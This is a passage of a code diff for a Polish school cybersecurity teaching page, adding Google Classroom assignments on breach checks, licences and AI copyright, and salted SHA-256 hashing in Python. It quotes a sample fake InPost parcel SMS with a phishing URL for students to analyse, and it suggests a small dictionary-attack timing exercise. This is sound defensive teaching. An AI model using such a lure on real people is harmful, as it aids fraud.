@@ -1075,120 +1075,585 @@ print(f"Hash: {hash_val}")</code></pre>
     </section>
 
     <!-- ==================== TAB 6: ZADANIA CLASSROOM ==================== -->
-    <section id="tab-classroom" class="tab-pane space-y-6 hidden">
-      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
-        <div>
-          <h2 class="text-xl font-bold font-mono text-white flex items-center gap-2">
-            <span>📋</span> Zadania do Google Classroom
+        <!-- ==================== TAB 6: ZADANIA CLASSROOM & KARTY PRACY ==================== -->
+    <section id="tab-classroom" class="tab-pane space-y-8 hidden">
+      
+      <!-- Section Header -->
+      <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 p-6 rounded-2xl border border-cyber-border bg-gradient-to-r from-cyber-card via-[#111927] to-cyber-card cyber-border-glow">
+        <div class="space-y-1">
+          <div class="inline-flex items-center gap-2 px-2.5 py-0.5 rounded-full bg-cyber-purple/15 border border-cyber-purple/30 text-cyber-purple text-[11px] font-mono font-bold uppercase">
+            <span>📋 Model Zoperacjonalizowany: Zrób &rarr; Przetestuj &rarr; Zgłoś</span>
+          </div>
+          <h2 class="text-xl sm:text-2xl font-black font-mono text-white tracking-wide">
+            Zadania Edukacyjne do Google Classroom
           </h2>
-          <p class="text-xs text-slate-400">Gotowe szablony zadań domowych i projektowych przygotowane przez Przemka – kopiuj jednym kliknięciem!</p>
+          <p class="text-xs sm:text-sm text-slate-300 max-w-3xl leading-relaxed">
+            Każde zadanie posiada precyzyjnie określony cel operacyjny, kryteria oceniania NaCoBeZu (od 3 do 6) oraz <strong>dwa dedykowane przyciski kopiowania</strong>: pełną treść zadania dla Nauczyciela oraz gotowy szablon formularza odpowiedzi dla Ucznia!
+          </p>
         </div>
-        <span class="text-xs font-mono text-cyber-purple bg-cyber-purple/10 border border-cyber-purple/30 px-3 py-1.5 rounded-lg">
-          Autorskie zadania INFOTECH
-        </span>
+        <div class="shrink-0 flex items-center gap-2">
+          <span class="text-xs font-mono text-cyber-neon bg-cyber-neon/10 border border-cyber-neon/30 px-3 py-2 rounded-xl">
+            4 Misje Projektowe
+          </span>
+        </div>
       </div>
 
-      <!-- Task 1: Liceum Assignment -->
-      <div class="rounded-xl border border-cyber-border bg-cyber-card p-6 space-y-4 cyber-border-glow">
-        <div class="flex items-start justify-between">
-          <div>
-            <div class="flex items-center gap-2">
-              <span class="text-xs font-mono px-2 py-0.5 rounded bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30 font-bold uppercase">Liceum • Lekcja 4</span>
-              <span class="text-xs font-mono text-slate-400">Czas: 30-45 min</span>
+      <!-- TASK 1: LICEUM - HAVEIBEENPWNED & SMS PHISHING -->
+      <div class="rounded-xl border border-cyber-border bg-cyber-card p-6 space-y-6 cyber-border-glow">
+        <div class="flex flex-col sm:flex-row sm:items-start justify-between gap-4 border-b border-cyber-border/60 pb-4">
+          <div class="space-y-1">
+            <div class="flex flex-wrap items-center gap-2">
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30 font-bold uppercase">Liceum • Lekcja 2-4</span>
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700">Czas: 45 min</span>
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-400 border border-emerald-500/30">Poziom: Podstawowy</span>
             </div>
-            <h3 class="text-lg font-bold font-mono text-white mt-2">Wyzwanie Podsumowujące: Zostań Audytorem Bezpieczeństwa</h3>
-            <p class="text-xs text-slate-400">Śledztwo w sieci (HaveIBeenPwned) oraz analiza złośliwego SMS-a na paczkę</p>
+            <h3 class="text-lg font-bold font-mono text-white mt-1">
+              Misja LO-01: Operacja „Tarcza Osobista” – Audyt Wycieków & Dekonstrukcja Phishingu SMS
+            </h3>
+            <p class="text-xs text-slate-400">
+              Wcielasz się w rolę Osobistego Audytora Bezpieczeństwa Cyfrowego. Wykonujesz audyt adresu e-mail, analizujesz wektor ataku złośliwego SMS-a i tworzysz instrukcję obrony dla rodziny.
+            </p>
           </div>
-          <button onclick="copyClassroomTask('task-lo-content')" class="px-4 py-2 rounded-lg bg-cyber-cyan/15 hover:bg-cyber-cyan/30 text-cyber-cyan border border-cyber-cyan/40 text-xs font-mono font-bold transition flex items-center gap-2">
-            <span>📋 Kopiuj Zadanie</span>
-          </button>
+
+          <div class="flex flex-wrap gap-2 shrink-0">
+            <button onclick="copyTeacherTask('task-lo-1-teacher')" class="px-3 py-1.5 rounded-lg bg-cyber-cyan/15 hover:bg-cyber-cyan/25 text-cyber-cyan border border-cyber-cyan/40 text-xs font-mono font-bold transition flex items-center gap-1.5" title="Kopiuj pełną treść zadania do wklejenia w Google Classroom jako nauczyciel">
+              <span>📋 Treść dla Nauczyciela</span>
+            </button>
+            <button onclick="copyStudentTemplate('task-lo-1-student')" class="px-3 py-1.5 rounded-lg bg-cyber-neon/15 hover:bg-cyber-neon/25 text-cyber-neon border border-cyber-neon/40 text-xs font-mono font-bold transition flex items-center gap-1.5" title="Kopiuj szablon odpowiedzi dla ucznia do wypełnienia">
+              <span>✍️ Formularz dla Ucznia</span>
+            </button>
+          </div>
         </div>
 
-        <div id="task-lo-content" class="p-4 bg-cyber-dark rounded-xl border border-slate-800 text-xs font-mono text-slate-300 space-y-3 leading-relaxed">
-          <p class="text-cyber-neon font-bold"># TEMAT: Zostań Audytorem Bezpieczeństwa (Google Classroom)</p>
-          <p>Jako podsumowanie naszych zajęć wcielisz się w rolę audytora bezpieczeństwa IT i wykonasz dwa krótkie śledztwa.</p>
+        <!-- Operationalized Details -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 text-xs font-mono">
           
-          <div class="border-l-2 border-cyber-cyan pl-3 space-y-1">
-            <p class="font-bold text-white">KROK 1: Śledztwo w sieci (Wycieki)</p>
-            <p>1. Wejdź na darmową, zaufaną stronę stworzoną przez ekspertów: https://haveibeenpwned.com/</p>
-            <p>2. Wpisz swój adres e-mail (lub kogoś bliskiego za jego zgodą).</p>
-            <p>3. Sprawdź, na jakich stronach Twój e-mail pojawił się w wyciekach.</p>
+          <!-- Column 1: Objectives & Steps -->
+          <div class="space-y-3 lg:col-span-2">
+            <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-3">
+              <div class="text-cyber-cyan font-bold flex items-center gap-2">
+                <span>🎯 CEL OPERACYJNY (Co potrafisz po wykonaniu zadania?):</span>
+              </div>
+              <ul class="text-slate-300 font-sans list-disc list-inside space-y-1 text-xs">
+                <li>Potrafisz zweryfikować czy Twój adres e-mail krąży w bazach cyberprzestępców (Darknet / HaveIBeenPwned).</li>
+                <li>Rozpoznajesz 4 mechanizmy socjotechniczne stosowane w fałszywych wiadomościach kurierskich (InPost / Poczta).</li>
+                <li>Potrafisz sformułować zrozumiałe reguły cyberhigieny dla członków rodziny nietechnicznej.</li>
+              </ul>
+
+              <div class="text-cyber-warning font-bold pt-2 flex items-center gap-2">
+                <span>🛠️ INSTRUKCJA WYKONAWCZA KROK PO KROKU:</span>
+              </div>
+              <ol class="text-slate-300 font-sans list-decimal list-inside space-y-2 text-xs">
+                <li><strong>Krok 1 (Śledztwo wyciekowe):</strong> Wejdź na <code class="text-cyber-neon">https://haveibeenpwned.com</code>. Wpisz swój e-mail (lub e-mail testowy/rodzica za zgodą). Sprawdź liczbę wycieków i zanotuj nazwę co najmniej jednego serwisu oraz kategorie ujawnionych danych (hasła, PESELe, telefony).</li>
+                <li><strong>Krok 2 (Sekcja zwłok złośliwego SMS-a):</strong> Przeanalizuj wiadomość: <em>„Twoja paczka InPost zostala wstrzymana z powodu niedoplaty 1,50 PLN. Kliknij w link aby uregulowac: http://inpost-platnosci-paczka.pl/login”</em>. Wskaż 2 czerwone flagi i wyjaśnij dlaczego oszust podał małą kwotę 1,50 zł.</li>
+                <li><strong>Krok 3 (Procedura obronna):</strong> Zaproponuj 3 konkretne kroki zaradcze (np. wdrożenie menedżera Bitwarden, włączenie aplikacji 2FA, zgłoszenie SMS na bezpłatny numer 8080).</li>
+              </ol>
+            </div>
           </div>
 
-          <div class="border-l-2 border-cyber-cyan pl-3 space-y-1">
-            <p class="font-bold text-white">KROK 2: Analiza złośliwego SMS-a</p>
-            <p>Wyobraź sobie, że dostałeś SMS o treści: "Twoja paczka InPost zostala wstrzymana z powodu niedoplaty 1,50 PLN. Kliknij w link aby uregulowac: http://inpost-platnosci-paczka.pl/login"</p>
-          </div>
-
-          <div class="border-t border-slate-700 pt-2 font-semibold text-cyber-cyan">
-            <p>CO MUSISZ ODDAĆ W GOOGLE CLASSROOM:</p>
-            <p>1. Wynik z kroku 1: Czy Twój e-mail był w wycieku? Podaj nazwę JEDNEJ strony lub napisz, że jest czysty.</p>
-            <p>2. Wynik z kroku 2: Wskaż dokładnie 2 powody (czerwone flagi), po których poznajesz oszustwo – wyjaśnij to tak, jakbyś tłumaczył to swojej babci.</p>
+          <!-- Column 2: Grading Rubric NaCoBeZu -->
+          <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-3 flex flex-col justify-between">
+            <div>
+              <div class="text-cyber-purple font-bold flex items-center gap-2 mb-2">
+                <span>📊 KRYTERIA OCENY (NaCoBeZu):</span>
+              </div>
+              <div class="space-y-2 text-[11px]">
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-amber-400 block">Dostateczny (3):</strong>
+                  <span class="text-slate-300">Sprawdzenie adresu w HIBP oraz wskazanie 1 czerwonej flagi w SMS.</span>
+                </div>
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-cyber-cyan block">Dobry (4):</strong>
+                  <span class="text-slate-300">Pełny audyt HIBP (nazwa bazy + typ danych) + 2 flagi wyjaśnione prostym językiem dla babci.</span>
+                </div>
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-cyber-neon block">Bardzo Dobry (5):</strong>
+                  <span class="text-slate-300">Ocena 4 + analiza techniczna domeny (brak HTTPS, subdomena) + 3 rekomendacje 1:1, Bitwarden, 2FA.</span>
+                </div>
+                <div class="p-2 rounded bg-purple-950/40 border border-purple-500/40">
+                  <strong class="text-purple-300 block">Celujący (6) - Wyzwanie:</strong>
+                  <span class="text-slate-300">Zainstalowanie menedżera Bitwarden lub włączenie 2FA na wybranym koncie i dołączenie zrzutu ekranu potwierdzającego wdrożenie!</span>
+                </div>
+              </div>
+            </div>
           </div>
         </div>
+
+        <!-- Hidden texts for clipboard copy -->
+        <div id="task-lo-1-teacher" class="hidden"># ZADANIE DLA KLASY: Operacja „Tarcza Osobista” – Audyt Wycieków i Analiza Phishingu
+Termin oddania: Najbliższa lekcja informatyki
+Platforma: Google Classroom
+
+DROGI UCZNIU!
+W ramach modułu Cyberbezpieczeństwa w INFOTECH wcielasz się w rolę Audytora Bezpieczeństwa IT. Twoim zadaniem jest zbadanie higieny własnych kont oraz dekonstrukcja socjotechnicznego ataku SMS.
+
+INSTRUKCJA KROK PO KROKU:
+1. Wejdź na https://haveibeenpwned.com i sprawdź swój adres e-mail (lub adres testowy/bliskiej osoby za zgodą).
+2. Jeśli adres wystąpił w wyciekach: zapisz nazwę serwisu, rok oraz jakie dane wyciekły. Jeśli jest czysty – napisz o tym i sprawdź popularny serwis np. Adobe lub Canva.
+3. Przeanalizuj złośliwy SMS: "Twoja paczka InPost zostala wstrzymana z powodu niedoplaty 1,50 PLN. Kliknij: http://inpost-platnosci-paczka.pl/login".
+4. Wskaż min. 2 czerwone flagi i wyjaśnij prostym językiem (jak dla babci), dlaczego nie wolno w to klikać.
+5. Sformułuj 3 złote zasady ochrony tożsamości.
+6. [Dla chętnych na ocenę 6]: Skonfiguruj menedżer haseł (np. Bitwarden) lub włącz 2FA i dołącz zrzut ekranu!
+
+KRYTERIA OCENY (NaCoBeZu):
+- Ocena 3: Sprawdzenie adresu w HIBP i wskazanie 1 flagi.
+- Ocena 4: Pełne odpowiedzi z nazwami wycieków i 2 flagi z uzasadnieniem.
+- Ocena 5: Wyczerpująca analiza techniczna domeny i 3 rekomendacje.
+- Ocena 6: Dołączenie dowodu wdrożenia menedżera Bitwarden lub 2FA.</div>
+
+        <div id="task-lo-1-student" class="hidden">--- FORMULARZ ODPOWIEDZI UCZNIA (Wklej do Google Classroom) ---
+Imię i Nazwisko: [WPISZ TUTAJ]
+Klasa: [WPISZ KLASĘ, NP. 1A LO]
+Data: [RRRR-MM-DD]
+
+1. WYNIK AUDYTU HAVEIBEENPWNED:
+- Sprawdzony adres: [NP. moj_email@gmail.com / KONTO CZYSTE]
+- Czy wystąpił w wyciekach? [TAK / NIE]
+- Nazwa bazy wyciekowej i rok (jeśli dotyczy): [NP. Morele.net 2018 / Wattpad / Adobe]
+- Jakie dane dostały się w ręce hakerów?: [NP. hasła w hashu, numery telefonów, adresy zamieszkania]
+
+2. ANALIZA ZŁOŚLIWEGO SMS-A (INPOST 1,50 PLN):
+- Czerwona flaga 1: [NP. Presja czasu i wywoływanie sztucznej paniki - wyjaśnienie...]
+- Czerwona flaga 2: [NP. Fałszywy adres URL inpost-platnosci-paczka.pl oraz brak szyfrowania HTTPS...]
+- Dlaczego oszuści żądają drobnej kwoty 1,50 zł, a nie 500 zł?: [Wyjaśnienie: ...]
+
+3. TRZY ZŁOTE ZASADY BEZPIECZEŃSTWA DLA MOJEJ RODZINY:
+- Zasada 1: [Unikalne hasło 1:1...]
+- Zasada 2: [Menedżer haseł...]
+- Zasada 3: [Weryfikacja dwuetapowa 2FA i numer 8080...]
+
+4. WYZWANIE NA OCENĘ 6 (OPCJONALNIE):
+- [Opis wdrożenia menedżera Bitwarden lub 2FA + załączony zrzut ekranu]: ...
+----------------------------------------------------------------</div>
       </div>
 
-      <!-- Task 2: Technikum Project -->
-      <div class="rounded-xl border border-cyber-border bg-cyber-card p-6 space-y-4 cyber-border-glow">
-        <div class="flex items-start justify-between">
-          <div>
-            <div class="flex items-center gap-2">
-              <span class="text-xs font-mono px-2 py-0.5 rounded bg-cyber-purple/15 text-cyber-purple border border-cyber-purple/30 font-bold uppercase">Technikum • Moduł Projektowy 2-3</span>
-              <span class="text-xs font-mono text-slate-400">Czas: 90 min (Projekt)</span>
+      <!-- TASK 2: LICEUM - OPEN SOURCE & AI ETHICS -->
+      <div class="rounded-xl border border-cyber-border bg-cyber-card p-6 space-y-6 cyber-border-glow">
+        <div class="flex flex-col sm:flex-row sm:items-start justify-between gap-4 border-b border-cyber-border/60 pb-4">
+          <div class="space-y-1">
+            <div class="flex flex-wrap items-center gap-2">
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30 font-bold uppercase">Liceum • Lekcja 4-5</span>
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700">Czas: 45 min</span>
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-blue-500/10 text-blue-400 border border-blue-500/30">Prawo & Etyka IT</span>
             </div>
-            <h3 class="text-lg font-bold font-mono text-white mt-2">Biały Wywiad (OSINT) & Python Hash Generator</h3>
-            <p class="text-xs text-slate-400">Analiza głośnej afery wyciekowej (Morele/ALAB) oraz skrypt pętli SHA-256 w Google Colab</p>
+            <h3 class="text-lg font-bold font-mono text-white mt-1">
+              Misja LO-02: Operacja „Licencyjny Detektyw” – Legalność Kodu z GitHuba & Prawa Autorskie w Erze GenAI
+            </h3>
+            <p class="text-xs text-slate-400">
+              Uczysz się jak legalnie korzystać z kodu Open Source w projektach szkolnych i komercyjnych oraz poznajesz zasady etyki i praw autorskich generowanego kodu AI.
+            </p>
           </div>
-          <button onclick="copyClassroomTask('task-tech-content')" class="px-4 py-2 rounded-lg bg-cyber-purple/15 hover:bg-cyber-purple/30 text-cyber-purple border border-cyber-purple/40 text-xs font-mono font-bold transition flex items-center gap-2">
-            <span>📋 Kopiuj Zadanie</span>
-          </button>
+
+          <div class="flex flex-wrap gap-2 shrink-0">
+            <button onclick="copyTeacherTask('task-lo-2-teacher')" class="px-3 py-1.5 rounded-lg bg-cyber-cyan/15 hover:bg-cyber-cyan/25 text-cyber-cyan border border-cyber-cyan/40 text-xs font-mono font-bold transition flex items-center gap-1.5">
+              <span>📋 Treść dla Nauczyciela</span>
+            </button>
+            <button onclick="copyStudentTemplate('task-lo-2-student')" class="px-3 py-1.5 rounded-lg bg-cyber-neon/15 hover:bg-cyber-neon/25 text-cyber-neon border border-cyber-neon/40 text-xs font-mono font-bold transition flex items-center gap-1.5">
+              <span>✍️ Formularz dla Ucznia</span>
+            </button>
+          </div>
         </div>
 
-        <div id="task-tech-content" class="p-4 bg-cyber-dark rounded-xl border border-slate-800 text-xs font-mono text-slate-300 space-y-3 leading-relaxed">
-          <p class="text-cyber-purple font-bold"># MODUŁ PROJEKTOWY: BIAŁY WYWIAD I KRYPTOGRAFIA (Google Classroom)</p>
-          <p>W tym tygodniu działasz jako Red Team (audytor bezpieczeństwa). Zadanie składa się z dwóch misji.</p>
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 text-xs font-mono">
+          <div class="space-y-3 lg:col-span-2">
+            <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-3">
+              <div class="text-cyber-cyan font-bold flex items-center gap-2">
+                <span>🎯 CEL OPERACYJNY:</span>
+              </div>
+              <ul class="text-slate-300 font-sans list-disc list-inside space-y-1 text-xs">
+                <li>Potrafisz odróżnić licencję permisywną (MIT, Apache 2.0) od licencji typu copyleft (GNU GPL v3).</li>
+                <li>Wiesz kiedy użycie cudzego kodu z platformy GitHub wymaga udostępnienia własnych źródeł.</li>
+                <li>Rozumiesz status prawny wytworów modeli AI (ChatGPT / Claude / Midjourney) w świetle polskiego prawa autorskiego.</li>
+              </ul>
+
+              <div class="text-cyber-warning font-bold pt-2 flex items-center gap-2">
+                <span>🛠️ INSTRUKCJA WYKONAWCZA:</span>
+              </div>
+              <ol class="text-slate-300 font-sans list-decimal list-inside space-y-2 text-xs">
+                <li><strong>Krok 1 (Śledztwo na GitHubie):</strong> Znajdź na GitHubie dowolne popularne repozytorium (np. kalkulator, stronę w HTML/JS, bibliotekę). Otwórz plik <code class="text-cyber-neon">LICENSE</code>. Odczytaj typ licencji i wskaż 2 uprawnienia oraz 1 obowiązek programisty.</li>
+                <li><strong>Krok 2 (Case Study biznesowe):</strong> Twoja firma tworzy komercyjną aplikację dla banku. Programista wkleił moduł na licencji GPL v3. Wyjaśnij dyrektorowi, dlaczego może to doprowadzić do katastrofy prawnej (tzw. efekt wirusowy GPL).</li>
+                <li><strong>Krok 3 (Etyka i Prawa AI):</strong> Czy kod w 100% wygenerowany przez ChatGPT podlega ochronie prawa autorskiego? Kto jest jego autorem? Odpowiedz na podstawie aktualnych przepisów i orzecznictwa.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-3 flex flex-col justify-between">
+            <div>
+              <div class="text-cyber-purple font-bold flex items-center gap-2 mb-2">
+                <span>📊 KRYTERIA OCENY:</span>
+              </div>
+              <div class="space-y-2 text-[11px]">
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-amber-400 block">Dostateczny (3):</strong>
+                  <span class="text-slate-300">Wskazanie różnicy między licencją MIT a GPL w 2 zdaniach.</span>
+                </div>
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-cyber-cyan block">Dobry (4):</strong>
+                  <span class="text-slate-300">Poprawna analiza wybranego repozytorium z GitHuba + rozwiązanie Case Study GPL.</span>
+                </div>
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-cyber-neon block">Bardzo Dobry (5):</strong>
+                  <span class="text-slate-300">Ocena 4 + wyczerpująca analiza prawna praw autorskich do wytworów AI (utwór wg art. 1 pr. aut.).</span>
+                </div>
+                <div class="p-2 rounded bg-purple-950/40 border border-purple-500/40">
+                  <strong class="text-purple-300 block">Celujący (6) - Wyzwanie:</strong>
+                  <span class="text-slate-300">Stworzenie własnego pliku LICENSE (np. MIT z własnym nazwiskiem i 2026 r.) w repozytorium na GitHubie i podanie linku!</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div id="task-lo-2-teacher" class="hidden"># ZADANIE DLA KLASY: Licencyjny Detektyw – Prawo Autorskie i Etyka AI w IT
+Termin oddania: Najbliższe zajęcia
+Platforma: Google Classroom
+
+CELE ZADANIA:
+1. Rozróżnianie licencji Open Source (MIT, Apache 2.0, GNU GPL).
+2. Świadomość ryzyka prawnego włączania cudzego kodu do komercyjnych projektów.
+3. Kwestia praw autorskich i odpowiedzialności za kod generowany przez sztuczną inteligencję (GenAI).
+
+ZADANIA DO WYKONANIA:
+1. Znajdź na platformie GitHub dowolny projekt i przeanalizuj plik LICENSE.
+2. Odpowiedz na Case Study: Dlaczego włączenie biblioteki GPL v3 do zamkniętego programu wymusza udostępnienie całego kodu źródłowego?
+3. Przeanalizuj prawny status kodu generowanego przez LLM (kto jest autorem w myśl polskiej ustawy o prawie autorskim?).
+4. [Dla chętnych na ocenę 6]: Skonfiguruj własne repozytorium na GitHubie z wybraną licencją i wklej odnośnik!</div>
+
+        <div id="task-lo-2-student" class="hidden">--- FORMULARZ ODPOWIEDZI UCZNIA (Wklej do Google Classroom) ---
+Imię i Nazwisko: [WPISZ TUTAJ]
+Klasa: [WPISZ KLASĘ]
+Data: [RRRR-MM-DD]
+
+1. ANALIZA REPOZYTORIUM GITHUB:
+- Link do repozytorium: [NP. https://github.com/facebook/react]
+- Typ licencji z pliku LICENSE: [NP. MIT / Apache 2.0 / GPL v3]
+- Co wolno programiście według tej licencji?: [Wpisz 2 uprawnienia: ...]
+- Jaki warunek musi spełnić programista?: [NP. Zachowanie notki o prawach autorskich...]
+
+2. CASE STUDY: ZASADA COPYLEFT (WIRUSOWOŚĆ GPL):
+- Dlaczego użycie kodu GPL v3 w komercyjnym programie firmy stanowi problem prawny?:
+  [Wyjaśnienie: ...]
+
+3. PRAWO AUTORSKIE A SZTUCZNA INTELIGENCJA (AI):
+- Czy kod wygenerowany w 100% przez prompt do ChatGPT jest chroniony prawem autorskim?: [TAK / NIE]
+- Kto jest uznawany za autora w świetle polskiego prawa (art. 1 ustawy o prawie autorskim)?:
+  [Uzasadnienie: utworem jest tylko rezultat działalności twórczej CZŁOWIEKA...]
+
+4. WYZWANIE NA OCENĘ 6 (OPCJONALNIE):
+- Link do mojego repozytorium z poprawnie skonfigurowanym plikiem LICENSE: [LINK GITHUB]
+----------------------------------------------------------------</div>
+      </div>
+
+      <!-- TASK 3: TECHNIKUM - PYTHON SHA-256 HASH GENERATOR -->
+      <div class="rounded-xl border border-cyber-border bg-cyber-card p-6 space-y-6 cyber-border-glow">
+        <div class="flex flex-col sm:flex-row sm:items-start justify-between gap-4 border-b border-cyber-border/60 pb-4">
+          <div class="space-y-1">
+            <div class="flex flex-wrap items-center gap-2">
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-purple/15 text-cyber-purple border border-cyber-purple/30 font-bold uppercase">Technikum • Moduł 2-3</span>
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700">Czas: 90 min (Projekt)</span>
+              <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-purple/10 text-cyber-purple border border-cyber-purple/30">Kryptografia Skryptowa</span>
+            </div>
+            <h3 class="text-lg font-bold font-mono text-white mt-1">
+              Misja TECH-01: Operacja „Hash & Salt” – Implementacja Funkcji SHA-256 w Pythonie & Analiza Kolizji
+            </h3>
+            <p class="text-xs text-slate-400">
+              Działasz jako Red Team Developer. Tworzysz w Google Colab skrypt haszujący hasła ze słownika, implementujesz sól kryptograficzną i badasz efekt lawinowy.
+            </p>
+          </div>
+
+          <div class="flex flex-wrap gap-2 shrink-0">
+            <button onclick="copyTeacherTask('task-tech-1-teacher')" class="px-3 py-1.5 rounded-lg bg-cyber-purple/15 hover:bg-cyber-purple/25 text-cyber-purple border border-cyber-purple/40 text-xs font-mono font-bold transition flex items-center gap-1.5">
+              <span>📋 Treść dla Nauczyciela</span>
+            </button>
+            <button onclick="copyStudentTemplate('task-tech-1-student')" class="px-3 py-1.5 rounded-lg bg-cyber-neon/15 hover:bg-cyber-neon/25 text-cyber-neon border border-cyber-neon/40 text-xs font-mono font-bold transition flex items-center gap-1.5">
+              <span>✍️ Formularz dla Ucznia</span>
+            </button>
+          </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6 text-xs font-mono">
+          <div class="space-y-3 lg:col-span-2">
+            <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-3">
+              <div class="text-cyber-purple font-bold flex items-center gap-2">
+                <span>🎯 CEL OPERACYJNY:</span>
+              </div>
+              <ul class="text-slate-300 font-sans list-disc list-inside space-y-1 text-xs">
+                <li>Potrafisz wykorzystać bibliotekę <code class="text-cyber-neon">hashlib</code> w Pythonie do wygenerowania 256-bitowego skrótu heksadecymalnego.</li>
+                <li>Implementujesz bezpieczne solenie haseł (Salt) uniemożliwiające atak Tęczowymi Tablicami (Rainbow Tables).</li>
+                <li>Potrafisz uruchomić pętlę <code class="text-cyber-cyan">for</code> przetwarzającą listę haseł i zinterpretować efekt lawinowy.</li>
+              </ul>
+
+              <div class="text-cyber-warning font-bold pt-2 flex items-center gap-2">
+                <span>🛠️ INSTRUKCJA WYKONAWCZA:</span>
+              </div>
+              <ol class="text-slate-300 font-sans list-decimal list-inside space-y-2 text-xs">
+                <li><strong>Krok 1 (Google Colab):</strong> Utwórz nowy notatnik w <code class="text-cyber-purple">colab.research.google.com</code>. Zaimportuj moduł <code class="text-cyber-neon">hashlib</code> oraz <code class="text-cyber-neon">secrets</code>.</li>
+                <li><strong>Krok 2 (Funkcja z solą):</strong> Napisz funkcję <code class="text-cyber-cyan">zabezpiecz_haslo(haslo, sol)</code>, która łączy hasło z solą i zwraca <code class="text-cyber-neon">hexdigest()</code> SHA-256.</li>
+                <li><strong>Krok 3 (Pętla po słowniku):</strong> Zdefiniuj listę 4 popularnych haseł: <code class="text-slate-300">["admin", "123456", "qwerty", "zaq1@WSX"]</code>. Przeiteruj pętlą, generując dla każdego unikalną losową sól oraz hash. Wydrukuj wyniki.</li>
+                <li><strong>Krok 4 (Eksport i udostępnienie):</strong> W Colabie kliknij <em>Udostępnij &rarr; Każda osoba mająca link &rarr; Przeglądający</em>. Skopiuj link do formularza oddania.</li>
+              </ol>
+            </div>
+          </div>
+
+          <div class="p-4 bg-cyber-dark rounded-xl border border-slate-800 space-y-3 flex flex-col justify-between">
+            <div>
+              <div class="text-cyber-purple font-bold flex items-center gap-2 mb-2">
+                <span>📊 KRYTERIA OCENY:</span>
+              </div>
+              <div class="space-y-2 text-[11px]">
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-amber-400 block">Dostateczny (3):</strong>
+                  <span class="text-slate-300">Poprawne hashowanie pojedynczego hasła w Colabie bez pętli.</span>
+                </div>
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-cyber-cyan block">Dobry (4):</strong>
+                  <span class="text-slate-300">Pętla for po liście haseł + poprawne generowanie hashów SHA-256. Działający link Colab.</span>
+                </div>
+                <div class="p-2 rounded bg-slate-800/80 border border-slate-700">
+                  <strong class="text-cyber-neon block">Bardzo Dobry (5):</strong>
+                  <span class="text-slate-300">Ocena 4 + implementacja dynamicznej soli (Salt) + wyjaśnienie dlaczego ta sama sól dla wszystkich to błąd.</span>
+                </div>
+                <div class="p-2 rounded bg-purple-950/40 border border-purple-500/40">
+                  <strong class="text-purple-300 block">Celujący (6) - Wyzwanie:</strong>
+                  <span class="text-slate-300">Napisanie mini-skryptu sprawdzającego czas łamania prostego hasła (atak słownikowy przeciwko liście 10 słów) lub zliczającego bity różnicy w efekcie lawinowym!</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div id="task-tech-1-teacher" class="hidden"># ZADANIE PROJEKTOWE: Kryptografia w Pythonie – SHA-256, Sól i Efekt Lawinowy
+Profil: Technikum Informatyczne / Programistyczne
+Platforma: Google Classroom / Google Colab
+
+DROGI PRZYSZŁY INFORMATYKU!
+Jako adept bezpieczeństwa IT musisz rozumieć, jak systemy bazodanowe chronią sekrety użytkowników przed wyciekiem. Twoim zadaniem jest stworzenie silnika haszującego w chmurze Google Colab.
+
+WYMAGANIA TECHNICZNE:
+1. Notatnik Colab z poprawnie działającym kodem w Pythonie (moduł hashlib).
+2. Funkcja tworząca skrót SHA-256 z dołączeniem kryptograficznej soli (Salt).
+3. Pętla for iterująca po liście testowych haseł słownikowych.
+4. Krótki raport (2-3 zdania) wyjaśniający, dlaczego funkcja skrótu jest JEDNOKIERUNKOWA i czym różni się od szyfrowania symetrycznego (np. AES).
+5. Udostępniony publiczny link do notatnika z uprawnieniami do odczytu.</div>
+
+        <div id="task-tech-1-student" class="hidden">--- FORMULARZ ODPOWIEDZI UCZNIA (Wklej do Google Classroom) ---
+Imię i Nazwisko: [WPISZ TUTAJ]
+Klasa: [WPISZ KLASĘ, NP. 2TI TECHNIKUM]
+Data: [RRRR-MM-DD]
+
+1. LINK DO NOTATNIKA GOOGLE COLAB:
+- [Wklej link, np. https://colab.research.google.com/drive/...]
+(Upewnij się, że link ma uprawnienie: Każda osoba mająca link -> Przeglądający!)
+
+2. KOD MOJEJ GŁÓWNEJ FUNKCJI Z SOLĄ (Wklej fragment kodu Python):
+```python
+# [WPISZ KOD SWOJEJ FUNKCJI TUTAJ]
+import hashlib
+import secrets
+
